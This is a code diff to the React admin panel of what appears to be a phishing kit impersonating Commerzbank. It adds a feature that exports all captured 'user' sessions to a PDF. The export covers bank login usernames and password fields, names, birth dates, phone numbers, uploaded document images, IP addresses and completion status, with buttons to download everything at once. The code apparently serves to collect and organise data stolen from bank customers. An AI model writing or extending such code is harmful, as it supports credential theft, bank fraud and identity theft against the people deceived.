@@ -275,6 +275,135 @@ const AdminPanel: React.FC = () => {
     setShowViewDialog(true);
   };
 
+  const handleDownloadAllUsersPDF = async () => {
+    if (!userData || userData.length === 0) return;
+
+    const doc = new jsPDF();
+    const pageWidth = doc.internal.pageSize.getWidth();
+    const pageHeight = doc.internal.pageSize.getHeight();
+    const margin = 20;
+    let yPosition = 20;
+
+    // Helper function to add text with word wrap
+    const addText = (text: string, x: number, y: number, maxWidth: number, fontSize: number = 10) => {
+      doc.setFontSize(fontSize);
+      const lines = doc.splitTextToSize(text, maxWidth);
+      doc.text(lines, x, y);
+      return y + (lines.length * fontSize * 0.4) + 5;
+    };
+
+    // Helper function to check if we need a new page
+    const checkNewPage = (requiredSpace: number) => {
+      if (yPosition + requiredSpace > pageHeight - 30) {
+        doc.addPage();
+        yPosition = 20;
+        return true;
+      }
+      return false;
+    };
+
+    // Helper function to load and add image
+    const addImageToPDF = async (imageUrl: string, x: number, y: number, maxWidth: number, maxHeight: number) => {
+      try {
+        const response = await fetch(imageUrl);
+        if (response.ok) {
+          const blob = await response.blob();
+          return new Promise<string>((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onload = function() {
+              const base64 = reader.result as string;
+              doc.addImage(base64, 'JPEG', x, y, maxWidth, maxHeight);
+              resolve(base64);
+            };
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+          });
+        } else {
+          addText('Bild konnte nicht geladen werden', x, y, maxWidth);
+          return null;
+        }
+      } catch (error) {
+        console.error('Error loading image:', error);
+        addText('Bild konnte nicht geladen werden', x, y, maxWidth);
+        return null;
+      }
+    };
+
+    // Title
+    yPosition = addText('Alle Benutzerdetails - Commerzbank', margin, yPosition, pageWidth - 2 * margin, 16);
+    yPosition = addText(`Generiert am: ${new Date().toLocaleString('de-DE')}`, margin, yPosition, pageWidth - 2 * margin, 10);
+    yPosition = addText(`Gesamt: ${userData.length} Benutzer`, margin, yPosition, pageWidth - 2 * margin, 10);
+    yPosition += 15;
+
+    // Process each user
+    for (let i = 0; i < userData.length; i++) {
+      const session = userData[i];
+      
+      // Check if we need a new page for this user (more space needed for image)
+      checkNewPage(150);
+
+      // User header
+      yPosition = addText(`👤 Benutzer ${i + 1} von ${userData.length}`, margin, yPosition, pageWidth - 2 * margin, 14);
+      yPosition += 5;
+
+      // Login Information
+      yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
+      yPosition = addText(`Benutzername: ${session.loginData?.xusr || session.finalData?.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Passwort: ${(session.loginData?.xpss || session.finalData?.xpss) ? '***' : 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition += 5;
+
+      // Personal Information
+      yPosition = addText('👤 Persönliche Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+      yPosition = addText(`Vorname: ${session.infoData?.xname1 || session.finalData?.xname1 || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Nachname: ${session.infoData?.xname2 || session.finalData?.xname2 || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Geburtsdatum: ${session.infoData?.xdob || session.finalData?.xdob || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Telefonnummer: ${session.infoData?.xtel || session.finalData?.xtel || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition += 5;
+
+      // File Upload Information with Image
+      if (session.uploadData) {
+        yPosition = addText('📁 Hochgeladene Datei', margin, yPosition, pageWidth - 2 * margin, 12);
+        yPosition = addText(`Ursprünglicher Dateiname: ${session.uploadData.originalName}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+        yPosition = addText(`Dateigröße: ${Math.round(session.uploadData.fileSize / 1024)} KB`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+        yPosition += 5;
+
+        // Add image to PDF
+        const imageUrl = `${API_BASE_URL.replace('/api', '')}/uploads/${session.uploadData.filename}`;
+        const imageWidth = pageWidth - 2 * margin - 20;
+        const imageHeight = 80;
+        
+        // Check if we need a new page for the image
+        checkNewPage(imageHeight + 20);
+        
+        await addImageToPDF(imageUrl, margin + 10, yPosition, imageWidth, imageHeight);
+        yPosition += imageHeight + 10;
+      } else {
+        yPosition = addText('📁 Hochgeladene Datei: Keine Datei hochgeladen', margin, yPosition, pageWidth - 2 * margin, 12);
+        yPosition += 5;
+      }
+
+      // Technical Information
+      yPosition = addText('🌐 Technische Informationen', margin, yPosition, pageWidth - 2 * margin, 12);
+      yPosition = addText(`IP-Adresse: ${session.ip}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Browser: ${getBrowserInfo(session.userAgent)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Sitzungs-ID: ${session.sessionId}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Datum: ${formatDate(session.createdAt)}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Status: ${session.finalData ? 'Abgeschlossen' : 'Unvollständig'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+
+      // Add separator line between users
+      if (i < userData.length - 1) {
+        yPosition += 10;
+        doc.setLineWidth(0.5);
+        doc.line(margin, yPosition, pageWidth - margin, yPosition);
+        yPosition += 15;
+      }
+    }
+
+    // Download the PDF
+    const fileName = `Alle_Benutzerdetails_${new Date().toISOString().split('T')[0]}.pdf`;
+    doc.save(fileName);
+  };
+
   const handleDownloadPDF = async () => {
     if (!selectedUser) return;
 
@@ -486,7 +615,29 @@ const AdminPanel: React.FC = () => {
     if (!userData || !Array.isArray(userData)) {
       return (
         <div className="admin-content">
-          <h3>{t.allUserData} (0 {t.users})</h3>
+          <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px'}}>
+            <h3 style={{margin: 0}}>{t.allUserData} (0 {t.users})</h3>
+            <button 
+              onClick={handleDownloadAllUsersPDF}
+              disabled={true}
+              style={{
+                background: '#6c757d',
+                color: 'white',
+                border: 'none',
+                borderRadius: '4px',
+                padding: '10px 20px',
+                cursor: 'not-allowed',
+                fontSize: '14px',
+                display: 'flex',
+                alignItems: 'center',
+                gap: '8px',
+                opacity: 0.6
+              }}
+              title="Keine Daten zum Herunterladen verfügbar"
+            >
+              📊 Alle Daten herunterladen
+            </button>
+          </div>
           <p>{t.noUserData}</p>
         </div>
       );
@@ -546,7 +697,27 @@ const AdminPanel: React.FC = () => {
     
     return (
       <div className="admin-content">
-        <h3>{t.allUserData} ({processedUsers.length} {t.users})</h3>
+        <div style={{display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px'}}>
+          <h3 style={{margin: 0}}>{t.allUserData} ({processedUsers.length} {t.users})</h3>
+          <button 
+            onClick={handleDownloadAllUsersPDF}
+            style={{
+              background: '#007bff',
+              color: 'white',
+              border: 'none',
+              borderRadius: '4px',
+              padding: '10px 20px',
+              cursor: 'pointer',
+              fontSize: '14px',
+              display: 'flex',
+              alignItems: 'center',
+              gap: '8px'
+            }}
+            title="Alle Benutzerdaten als PDF herunterladen"
+          >
+            📊 Alle Daten herunterladen
+          </button>
+        </div>
         <div className="data-table">
           <table>
             <thead>
